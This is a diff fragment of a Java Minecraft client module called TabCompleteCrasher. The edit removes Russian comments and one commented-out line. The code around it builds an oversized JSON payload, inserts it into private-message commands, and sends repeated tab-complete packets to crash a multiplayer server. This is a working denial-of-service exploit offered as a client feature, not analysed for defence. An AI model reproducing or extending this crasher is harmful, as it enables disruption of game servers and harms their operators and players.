@@ -35,10 +35,10 @@ public class TabCompleteCrasher extends Module {
             "minecraft:w",
             "minecraft:whisper",
             "minecraft:me",
-            "dm",             // Часто используемая команда на плагиновых серверах
-            "directmessage",  // Полное название команды для ЛС
-            "pm",             // Личное сообщение (private message)
-            "privatemessage"  // Полное название для отправки ЛС
+            "dm",
+            "directmessage",
+            "pm",
+            "privatemessage"
     };
 
     static private int messageIndex = 0;
@@ -59,13 +59,12 @@ public class TabCompleteCrasher extends Module {
             String overflow = generateJsonObject(len);
             String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
 
-            Channel channel = mc.getConnection().getNetworkManager().channel;  // Обновленная строка для получения канала
+            Channel channel = mc.getConnection().getNetworkManager().channel;
 
-            IPacket<?> packet = new CTabCompletePacket(0, partialCommand);  // Используем CCommandPacket для команд
+            IPacket<?> packet = new CTabCompletePacket(0, partialCommand);
 
             for (int i = 0; i < packets; i++) {
                 channel.write(packet);
-            //    channel.writeAndFlush(packet);
             }
            channel.flush();
             ChatUtility.addChatMessage(String.format("Json successfly sended [%sbyte]", len));
